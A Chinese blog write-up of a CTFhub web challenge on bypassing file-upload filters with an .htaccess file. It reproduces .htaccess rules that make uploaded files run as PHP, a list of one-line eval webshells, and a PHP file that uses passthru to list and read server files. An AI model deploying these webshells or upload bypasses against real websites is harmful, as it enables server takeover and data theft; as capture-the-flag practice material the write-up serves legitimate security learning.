### 【CTF整理】CTFhub技能树-Web-文件上传-.htaccess

CTFhub技能树里面的题最近做了一些，但是除了之前的SQL注入之外，其他的我实在没什么兴趣整理，毕竟网上的整理出来的博主很多，之所以专门整理这个文件上传.htaccess的题目，是因为我踩坑了，本以为一道简单的题目我就这么硬生生的踩进去了，还差点没出来，浪费了不少金币啊。看别的博主都是上传.htaccess文件，上传修改后缀的一句话木马，菜刀或是蚁剑一连就getshell了，简单的不能再简单，为毛我试了N次都是不行？试了各种形式的.htaccess文件，各种报错。网上如此轻易用蚁剑连上的博主，我是不知道怎么做到的（可能是我菜逼吧，不过网上好像就一两个版本，严重怀疑是最开始的那一篇带偏一堆人） 。吐槽结束，记坑。

#### 1、常规思路

修改.htaccess文件，上传指定后缀名的一句话，菜刀连接getshell。------  失败

基本上就这样
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515013537844.png)

```
我试过的.htaccess内容：
版本1
<FilesMath  ".jpg">
SetHandler application/x-httpd-php
</FilesMatch>


版本2
AddType application/x-httpd-php .jpg


配合PHP各种一句话文件后缀.jpg，
<?php eval($_PTST['c']);?>
<?php eval($_GET['c']);?>
<?php @eval($_PTST['c']);?>
<?php @eval($_GET['c']);?>
<?php eval($_PTST["c"]);?>
<?php eval($_GET["c"]);?>
<?php @eval($_PTST["c"]);?>
<?php @eval($_GET["c"]);?>


亲测，菜刀蚁剑没有一个能正常连接，要么200ok啥都不显示或者显示一句话，连不上，要么直接404，还有500的。

```

这种思路就是网上最流行的思路，想看的小伙伴可以看这里
 https://www.cnblogs.com/anweilx/p/12523582.html

##### 2、PHP passthru()函数

这个方法不需要菜刀，蚁剑什么，弱爆了，直接浏览器访问就看到了flag好吗，给想出这个方法的大佬点赞。
 PHP的passthru()这个函数可以直接执行外部命令，用法passthru" ls ")，同样有此功能的函数还有
 exec()、system()、 shell_exec()等。

**解法**
 这里先写一个.htaccess文件上传

```
<FilesMatch "sj">  //sj随便写的，后面上传的文件没有后缀，就叫sj
 SetHandler application/x-httpd-php
</FilesMatch>
```

然后写sj文件内容如下：

```
<?php 
#passthru("ls /var/www/html/"); //第一次只写这一行，用来找flag文件在哪里
passthru("cat /var/www/html/flag_229326633.php");//第二次是找到了flag文件之后，直接读取内容
?>
```

上传sj文件，然后浏览器直接访问文件：
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515013356949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)这里啥都没有，需要查看源码。（小坑小坑）
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515013440997.png)得到flag

总结：
 有时候不要太依赖菜刀蚁剑之类的工具，不一定要一句话，我们还可以直接执行外部命令查看，PHP常见可以用来执行外部命令的函数有 passthru()、exec()、system()、 shell_exec()等。（不要太相信网上的解法，自己多动手尝试）

by 久违 2020.5.15 夜